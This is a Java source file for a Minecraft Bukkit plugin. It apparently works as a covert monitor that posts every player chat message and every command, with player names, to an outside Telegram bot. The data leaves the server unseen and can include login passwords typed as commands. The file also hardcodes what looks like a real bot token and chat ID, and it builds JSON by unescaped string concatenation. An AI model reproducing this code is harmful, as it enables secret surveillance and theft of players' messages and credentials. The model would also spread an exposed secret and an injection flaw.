package me.mohapre;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class Main extends JavaPlugin implements Listener {

    private final String botToken = "8696372248:AAHwMz-fkfpT3Safhf_OGy05duNu91ds7uo";
    private final String chatId = "8288001731"; 

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        sendToTelegram("📡 نظام المراقبة متصل! السيرفر قيد العمل الآن.");
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String msg = "💬 [Chat] " + event.getPlayer().getName() + ": " + event.getMessage();
        sendToTelegram(msg);
    }

    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        String cmd = "⚙️ [Cmd] " + event.getPlayer().getName() + ": " + event.getMessage();
        sendToTelegram(cmd);
    }

    private void sendToTelegram(String text) {
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                String json = "{\"chat_id\": \"" + chatId + "\", \"text\": \"" + text + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }
                conn.getResponseCode();
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }
}

